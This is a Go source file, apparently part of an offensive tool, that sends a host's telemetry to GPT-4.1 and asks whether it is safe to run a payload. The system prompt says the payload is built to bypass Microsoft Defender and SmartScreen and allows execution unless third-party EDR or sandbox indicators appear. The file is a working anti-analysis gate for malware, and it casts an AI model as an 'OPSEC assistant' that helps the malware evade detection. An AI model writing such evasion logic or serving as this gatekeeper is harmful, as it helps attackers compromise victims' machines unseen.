package ai

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"halo/logging"
	"halo/telemetry"
	"io"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type AIResponse struct {
	Allow    bool    `json:"allow"`
	Conf     float64 `json:"conf"`
	Reason   string  `json:"reason"`
	Thoughts string  `json:"thoughts"`
}

const systemPrompt = `
You are an AI OPSEC assistant analyzing telemetry from a host machine.
Your goal is to decide whether it is safe to execute a sensitive payload.

Rules:
- Carefully examine all telemetry fields: processes, drivers, USB, uptime, logons, idle time, active window, working hours.
- Windows Defender and SmartScreen are considered baseline and expected in most environments.
- The payload and execution method are specifically designed to bypass Microsoft Defender and SmartScreen.
- Presence of ONLY Microsoft Defender/SmartScreen is NOT a reason to block execution.
- Deny execution ONLY if strong third-party EDR/AV (e.g., CrowdStrike, SentinelOne, Carbon Black, Sophos) or sandbox/analysis indicators are present.
- Consider deviations from baseline, monitoring tools, or sandbox artifacts as unsafe.
- If unsafe, respond with: {"allow": false, "reason": "...", "conf": 0.xx}
- If safe, respond with: {"allow": true, "reason": "...", "conf": 0.xx}
- Confidence ("conf") is a float between 0 and 1.
- Only output JSON. Do not add commentary.
`

func AskOpenAI(t telemetry.Telemetry, apiKey string) (AIResponse, error) {
	payload := map[string]interface{}{
		"model": "gpt-4.1",
		"messages": []map[string]string{
			{"role": "system", "content": systemPrompt},
			{"role": "user", "content": telemetryToJSON(t)},
		},
		"temperature": 0,
	}

	data, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.openai.com/v1/chat/completions", bytes.NewBuffer(data))
	req.Header.Set("Authorization", "Bearer "+apiKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 60 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return AIResponse{}, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)

	// Step 1: log raw GPT response
	logging.LogLine("[GPT Raw Response] " + string(body))

	var result struct {
		Choices []struct {
			Message struct {
				Content string `json:"content"`
			} `json:"message"`
		} `json:"choices"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return AIResponse{}, err
	}
	if len(result.Choices) == 0 {
		return AIResponse{}, errors.New("no choices returned from GPT")
	}

	content := result.Choices[0].Message.Content

	// Step 2: log extracted GPT content
	logging.LogLine("[GPT Content] " + content)

	jsonStr := extractJSON(content)
	if jsonStr == "" {
		return AIResponse{}, errors.New("no valid JSON found in GPT response")
	}

	var parsed AIResponse
	if err := json.Unmarshal([]byte(jsonStr), &parsed); err != nil {
		return AIResponse{}, err
	}

	// Step 3: log structured decision
	logging.LogLine(
		"[GPT Decision] Allow: " +
			strconv.FormatBool(parsed.Allow) +
			" Conf: " + fmt.Sprintf("%.2f", parsed.Conf) +
			" Reason: " + parsed.Reason +
			" Thoughts: " + parsed.Thoughts,
	)

	return parsed, nil
}

func telemetryToJSON(t telemetry.Telemetry) string {
	data, _ := json.MarshalIndent(t, "", "  ")
	return string(data)
}

func extractJSON(s string) string {
	// Enable "dotall" so .* spans multiple lines
	re := regexp.MustCompile(`(?s)\{.*\}`)
	match := re.FindString(s)
	return strings.TrimSpace(match)
}
